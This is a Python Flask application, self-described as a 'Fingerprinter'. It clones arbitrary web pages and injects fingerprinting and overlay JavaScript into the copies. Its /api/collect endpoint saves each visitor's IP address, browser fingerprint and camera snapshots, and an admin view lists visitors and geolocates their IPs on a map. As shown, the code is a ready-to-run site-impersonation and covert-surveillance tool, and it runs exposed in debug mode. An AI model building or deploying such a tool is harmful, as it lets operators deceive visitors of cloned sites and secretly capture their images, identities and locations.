from flask import Flask, render_template, request, jsonify, send_from_directory
import os
import json
import time
import base64
import hashlib
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime, UTC

app = Flask(__name__)

CAPTURE_DIR = "captures"
SNAPSHOT_TEMPLATE_DIR = "templates/snapshots"
SNAPSHOT_STATIC_DIR = "static/snapshots"

os.makedirs(CAPTURE_DIR, exist_ok=True)
os.makedirs(SNAPSHOT_TEMPLATE_DIR, exist_ok=True)
os.makedirs(SNAPSHOT_STATIC_DIR, exist_ok=True)


def get_client_ip():

    forwarded = request.headers.get("X-Forwarded-For")

    if forwarded:
        return forwarded.split(",")[0].strip()

    real_ip = request.headers.get("X-Real-IP")

    if real_ip:
        return real_ip

    return request.remote_addr


def get_today_folder():

    today = datetime.now(UTC).strftime("%Y-%m-%d")

    folder = os.path.join(CAPTURE_DIR, today)

    os.makedirs(folder, exist_ok=True)

    return folder


@app.route("/")
def index():
    return render_template("themes/index.html")


@app.route("/theme/<name>")
def theme(name):

    try:
        return render_template(f"themes/{name}.html")
    except:
        return "Theme not found", 404


def download_asset(url, path):

    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            with open(path, "wb") as f:
                f.write(r.content)
    except:
        pass


def snapshot_page(url):

    try:

        if not url.startswith("http"):
            url = "http://" + url

        r = requests.get(url, timeout=10, headers={
            "User-Agent": "Mozilla/5.0"
        })

        html = r.text

        snapshot_id = hashlib.sha1(url.encode()).hexdigest()[:10]

        template_dir = f"{SNAPSHOT_TEMPLATE_DIR}/{snapshot_id}"
        static_dir = f"{SNAPSHOT_STATIC_DIR}/{snapshot_id}"

        os.makedirs(template_dir, exist_ok=True)
        os.makedirs(static_dir, exist_ok=True)

        soup = BeautifulSoup(html, "html.parser")

        if not soup.body:
            body = soup.new_tag("body")
            soup.append(body)

        for tag in soup.find_all("img"):

            src = tag.get("src")

            if not src:
                continue

            full_url = urljoin(url, src)

            try:

                filename = os.path.basename(full_url.split("?")[0])

                if not filename:
                    filename = f"{hashlib.md5(full_url.encode()).hexdigest()}.jpg"

                local_path = f"{static_dir}/{filename}"

                download_asset(full_url, local_path)

                tag["src"] = f"/static/snapshots/{snapshot_id}/{filename}"

            except Exception as e:
                print("[IMG ERROR]", e)

        # ================================
        # 🔥 INJEÇÃO CORRETA AQUI
        # ================================

        base_dir = os.path.dirname(__file__)

        try:
            with open(os.path.join(base_dir, "static/js/fingerprint.js"), encoding="utf-8") as f:
                fingerprint_js = f.read()
        except:
            fingerprint_js = ""

        try:
            with open(os.path.join(base_dir, "static/js/overlay.js"), encoding="utf-8") as f:
                overlay_js = f.read()
        except:
            overlay_js = ""

        inject_script = soup.new_tag("script")

        inject_script.string = f"""
{fingerprint_js}

{overlay_js}
"""

        soup.body.append(inject_script)

        # ================================

        with open(f"{template_dir}/index.html", "w", encoding="utf-8") as f:
            f.write(str(soup))

        return snapshot_id

    except Exception as e:

        print("\n[SNAPSHOT ERROR]")
        print(e)

        return None


@app.route("/api/snapshot", methods=["POST"])
def create_snapshot():

    data = request.json
    url = data.get("url")

    if not url:
        return jsonify({"error": "missing url"}), 400

    snapshot_id = snapshot_page(url)

    if not snapshot_id:
        return jsonify({"error": "failed to create snapshot"}), 500

    return jsonify({
        "ok": True,
        "snapshot": snapshot_id,
        "url": f"/snapshot/{snapshot_id}"
    })


@app.route("/snapshot/<snap_id>")
def view_snapshot(snap_id):

    path = os.path.join(SNAPSHOT_TEMPLATE_DIR, snap_id)

    if not os.path.exists(path):
        return "snapshot not found", 404

    return send_from_directory(path, "index.html")


@app.route("/admin")
def admin():
    return render_template("themes/admin.html")


@app.route("/api/collect", methods=["POST"])
def collect():

    data = request.json

    folder = get_today_folder()

    timestamp = int(time.time() * 1000)

    json_path = os.path.join(folder, f"{timestamp}.json")

    capture = {

        "timestamp": datetime.now(UTC).isoformat(),
        "ip": get_client_ip(),
        "user_agent": request.headers.get("User-Agent"),
        "fingerprint": data

    }

    with open(json_path, "w") as f:
        json.dump(capture, f, indent=2)

    camera_data = data.get("cameraImage")

    if camera_data:

        try:

            image_data = camera_data.split(",")[1]
            img_bytes = base64.b64decode(image_data)

            img_path = os.path.join(folder, f"{timestamp}.jpg")

            with open(img_path, "wb") as img_file:
                img_file.write(img_bytes)

        except:
            pass

    return jsonify({"ok": True})


@app.route("/api/visitors")
def visitors():

    visitors = []

    if not os.path.exists(CAPTURE_DIR):
        return jsonify(visitors)

    for date_folder in sorted(os.listdir(CAPTURE_DIR), reverse=True):

        folder_path = os.path.join(CAPTURE_DIR, date_folder)

        if not os.path.isdir(folder_path):
            continue

        for file in sorted(os.listdir(folder_path), reverse=True):

            if not file.endswith(".json"):
                continue

            path = os.path.join(folder_path, file)

            try:
                with open(path) as f:
                    visitors.append(json.load(f))
            except:
                pass

    return jsonify(visitors)


@app.route("/api/map")
def visitor_map():

    points = []

    if not os.path.exists(CAPTURE_DIR):
        return jsonify(points)

    for date_folder in os.listdir(CAPTURE_DIR):

        folder_path = os.path.join(CAPTURE_DIR, date_folder)

        if not os.path.isdir(folder_path):
            continue

        for file in os.listdir(folder_path):

            if not file.endswith(".json"):
                continue

            try:

                with open(os.path.join(folder_path, file)) as f:
                    data = json.load(f)

                ip = data.get("ip")

                if not ip:
                    continue

                if ip.startswith("127") or ip == "localhost":
                    continue

                r = requests.get(
                    f"http://ip-api.com/json/{ip}",
                    timeout=3
                )

                geo = r.json()

                if geo["status"] == "success":

                    points.append({
                        "lat": geo["lat"],
                        "lon": geo["lon"],
                        "city": geo["city"],
                        "country": geo["country"],
                        "ip": ip
                    })

            except:
                pass

    return jsonify(points)


if __name__ == "__main__":

    print("\nFingerprinter running\n")

    app.run(
        host="0.0.0.0",
        port=8080,
        debug=True
    )